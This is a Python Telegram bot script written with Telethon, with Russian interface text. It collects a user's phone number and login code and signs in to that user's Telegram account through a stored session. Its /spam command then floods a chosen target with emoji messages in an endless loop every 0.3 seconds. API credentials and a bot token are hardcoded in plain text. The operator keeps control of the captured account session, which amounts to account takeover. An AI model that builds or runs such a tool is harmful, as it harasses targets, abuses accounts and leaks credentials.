import asyncio
import os
from telethon import TelegramClient, events, Button

API_ID = 34887681
API_HASH = "9a2905a9627fb1959b6699452ec59e99"
BOT_TOKEN = "8990879407:AAHi7CTsOEhLSAr38RnL6dK5teG9Bj28IuQ"

os.makedirs("sessions", exist_ok=True)

user_states = {}

async def main():
    # БОТ
    bot = await TelegramClient("sessions/bot_session", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
    
    # ОДИН клиент для пользователя — запускаем 1 раз
    user_client = await TelegramClient("sessions/user_main", API_ID, API_HASH).start()
    
    @bot.on(events.NewMessage(pattern='/start'))
    async def start(event):
        chat_id = event.chat_id
        if chat_id in user_states and user_states[chat_id].get('logged'):
            await event.reply('✅ Уже вошёл! /spam @username')
            return
        
        buttons = [[Button.request_phone('📱 Отправить номер', resize=True)]]
        await event.reply('Нажми кнопку:', buttons=buttons)
        user_states[chat_id] = {'step': 'wait_number'}

    @bot.on(events.NewMessage(func=lambda e: e.contact))
    async def get_contact(event):
        chat_id = event.chat_id
        if chat_id not in user_states:
            await event.reply('❌ /start')
            return
        
        number = event.contact.phone_number
        if not number.startswith('+'):
            number = '+' + number
        
        try:
            sent = await user_client.send_code_request(number)
            user_states[chat_id] = {
                'step': 'wait_code',
                'number': number,
                'phone_code_hash': sent.phone_code_hash
            }
            await event.reply(f'✅ Код на {number}. Введи цифры:')
        except Exception as e:
            await event.reply(f'❌ {str(e)[:150]}')

    @bot.on(events.NewMessage(pattern=r'^\d{4,6}$'))
    async def get_code(event):
        chat_id = event.chat_id
        if chat_id not in user_states:
            await event.reply('❌ /start')
            return
        
        state = user_states[chat_id]
        if state.get('step') != 'wait_code':
            await event.reply('❌ Сначала номер')
            return
        
        code = event.raw_text.strip()
        
        try:
            await user_client.sign_in(
                phone=state['number'],
                code=code,
                phone_code_hash=state['phone_code_hash']
            )
            user_states[chat_id]['step'] = 'logged'
            user_states[chat_id]['logged'] = True
            await event.reply('✅ Вход готов! /spam @username')
        except Exception as e:
            await event.reply(f'❌ {str(e)[:150]}')

    @bot.on(events.NewMessage(pattern='/spam'))
    async def start_spam(event):
        chat_id = event.chat_id
        if chat_id not in user_states or not user_states[chat_id].get('logged'):
            await event.reply('❌ Сначала войди')
            return
        
        parts = event.raw_text.split()
        if len(parts) < 2:
            await event.reply('⚠️ /spam @username')
            return
        
        target = parts[1].strip()
        
        try:
            target_user = await user_client.get_entity(target)
            await event.reply(f'🍪 Спам {target_user.first_name}!')
            count = 0
            while True:
                await user_client.send_message(target_user, '🍪' * 20)
                count += 1
                await asyncio.sleep(0.3)
                if count % 20 == 0:
                    await event.reply(f'📨 {count} пачек')
        except Exception as e:
            await event.reply(f'❌ {str(e)[:150]}')

    print('🍪 БОТ ЗАПУЩЕН!')
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
